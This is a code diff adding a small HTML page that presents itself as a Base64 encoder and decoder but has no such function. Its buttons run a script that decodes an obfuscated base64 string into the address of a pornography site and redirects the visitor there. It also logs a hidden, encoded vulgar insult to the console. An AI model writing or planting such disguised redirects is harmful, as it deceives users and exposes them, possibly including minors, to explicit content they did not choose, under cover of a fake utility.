@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Base64 Encoder and Decoder</title>
+</head>
+<body>
+    <h2>Base64 Encoder and Decoder</h2>
+    <button onclick="redirectToLink()">Click here to see your information</button>
+    <a href="#" onclick="redirectToLink()">Open to see the show</a>
+
+    <script>
+        function redirectToLink() {
+          
+            const itat = "aHR0cDovL3hueHguY29t"; 
+            const system = atob(itat);
+            window.location.href = system;
+            console.log(atob("bWF0aGthcmJhOXggbHlhIGxrb2QgbGFoIHluM2wgdGJvb24gbW9rIA=="))
+        }
+    </script>
+</body>
+</html>
